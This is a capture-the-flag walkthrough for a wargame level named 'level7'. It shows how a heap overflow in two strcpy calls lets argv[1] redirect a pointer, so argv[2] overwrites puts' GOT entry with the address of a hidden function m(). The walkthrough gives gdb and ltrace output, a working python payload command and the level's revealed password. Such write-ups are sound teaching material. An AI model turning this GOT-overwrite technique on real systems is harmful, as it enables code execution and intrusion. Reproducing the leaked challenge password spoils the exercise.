# level7

Nothing of note with `ll` and `checksec`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|printf|main|
|fgets|frame_dummy|
|time|m|
|strcpy||
|malloc||
|puts||
|fopen||

`frame_dummy()` does nothing (color me surprised).

we need to overwrite the address of puts with m
```sh
(gdb) x m
0x080484f4 <m>:	0x083e58955

(gdb) disass puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x08049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x080483a0
End of assembler dump.
(gdb) x 0x08049928
0x08049928 <puts@got.plt>:	0x08048406
``` 

So we need to write `m()`'s address at `puts()`' location on the **GOT**.
We will write`0x080484f4` at `0x08049928`.

Let's try to use ltrace to see where the `malloc()`s put our data.

```sh
ltrace ./level7 aa bb cc dd
__libc_start_main(0x8048521, 5, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018     # < address of argv[1]
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038     # < address of argv[2]
strcpy(0x0804a018, "aa")                         = 0x0804a018     # argv[1]
strcpy(0x0804a038, "bb")                         = 0x0804a038     # argv[2]
fopen("/home/user/level8/.pass", "r")            = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Now let's see while overflowing their allocated spaces
```sh
ltrace ./level7 aaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbb cccccccccccccccccccc dddddddddddddddddddd
__libc_start_main(0x8048521, 5, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008     # < address of argv[2]
malloc(8)                                        = 0x0804a018     # < address of argv[1]
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa")       = 0x0804a018     # argv[1]
strcpy(0x0804a000, "bbbbbbbbbbbbbbbbbbbb")       = 0x0804a000     # argv[2]
fopen("/home/user/level8/.pass", "r")            = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We can see that by overflowing the first `malloc()` the destination address of **argv[2]** strcpy changes to `0x0804a000`.

It can be confusing as to why it is written to this address. In short when we write our `20 * a` characters, the program reads it as `aaaaaaaaaaaaaaaaaaaa\0` with a *null ending character*. This is the only byte that is written on the next *4 bytes*. So `0x0804a038` becomes `0x0804a000`. If we were to add a trailing `A` to our input,  `aaaaaaaaaaaaaaaaaaaaA\0` would give this address `0x08004161` with the *null byte* being shifted by `A` (0x41 in hexadecimal), at which point, the program receives a *segfault*.

Now we just have to change it to the address of `puts()` on the **GOT** which is `\x28\x99\x04\x08` in writable little endian. Then it will write **argv[2]** to this address, in our case the address of `m()` which in writable little endian is `\xf4\x84\x04\x08`.

So, our payload will look like this

|argv[1] :|padding|address of `puts()` on the **GOT**|argv[2] :|address of `m()`|
|-|-|-|-|-|
||`a * 20`|\x28\x99\x04\x08||\xf4\x84\x04\x08|

```sh
./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1781697690
```

Let's go to **level8** using this flag.
```sh
su level8
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

NOTE:
Here we use a python subshell `$(python ...)` in order to pass those strings as CLI arguments of `./level7`.
